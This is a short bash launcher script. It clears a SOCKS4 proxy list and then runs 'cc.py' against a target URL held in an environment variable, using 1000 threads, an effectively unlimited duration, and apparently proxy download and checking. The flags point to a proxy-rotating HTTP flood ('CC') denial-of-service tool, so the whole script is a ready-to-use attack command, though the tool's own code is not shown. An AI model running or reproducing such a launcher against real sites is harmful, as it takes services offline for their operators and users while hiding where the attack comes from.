#!/bin/bash -x
rm -rf ./socks4.txt
python cc.py -url $URL -m cc -v 4 -t 1000 -f socks4.txt -b 1 -s 999999999999999 -down -check